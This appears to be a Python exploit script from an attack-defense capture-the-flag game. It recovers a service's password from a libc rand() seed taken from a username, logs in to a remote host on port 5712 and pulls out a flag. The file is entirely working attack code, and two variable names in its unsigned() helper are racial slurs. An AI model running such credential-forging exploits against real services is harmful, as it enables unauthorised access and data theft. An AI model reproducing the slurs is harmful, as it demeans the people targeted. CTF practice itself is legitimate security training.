#!/usr/bin/env python3

import sys
import socket
import requests
from ctypes import CDLL

def unsigned(byte_str: bytes):
    nigger = 0x1
    chingchong = 0x100
    out = 0x0
    for i in byte_str:
        out += i * nigger
        nigger *= chingchong
    return out

def reverse_get_pass(username : str):
    libc = CDLL("libc.so.6")
    username = username.encode()
    key1 = unsigned(username[:4])
    key2 = unsigned(username[4:])
    libc.srand(key1)
    some_censored_word = libc.rand()
    for papa in range(13):
        some_censored_word ^= libc.rand()
    some_censored_word ^= key2
    password = hex(some_censored_word)[2:]
    return password

ADDR = (sys.argv[1], 5712)
hint = sys.argv[2].split(':')
print(hint[0])
password = reverse_get_pass(hint[0])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(ADDR)
s.settimeout(5)
s.recv(1024)
s.send(b'1\n')
s.recv(1024)
s.send((password + '\n').encode())
s.recv(1024)
s.recv(1024)
s.send(b'2\n')
s.recv(1024)
s.send(hint[1].encode())
flag = s.recv(1024)
s.recv(1024)
s.send(b'3\n')
print(flag.decode(), flush= True)
